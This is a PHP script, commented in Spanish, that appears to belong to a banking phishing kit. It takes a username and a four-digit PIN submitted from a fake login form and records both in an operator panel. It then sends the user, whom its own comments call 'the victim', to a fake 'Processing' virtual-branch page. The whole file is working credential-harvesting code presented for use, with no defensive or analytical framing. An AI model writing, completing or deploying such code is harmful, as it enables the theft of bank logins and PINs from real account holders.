<?php
// process/pasousuario.php
require('../panel/lib/funciones.php');

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; // El PIN de 4 dígitos
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. Creamos el registro con el usuario
    $id = crear_registro($user, $dispositivo);
    
    // 2. Le añadimos la clave inmediatamente
    actualizar_registro_pass($id, $pass);
    
    // 3. Mandamos a la víctima a la pantalla de "Procesando" (la sucursal virtual)
    header("Location: ../a/WAITING.php");
} else {
    header("Location: ../index.php");
}
exit();
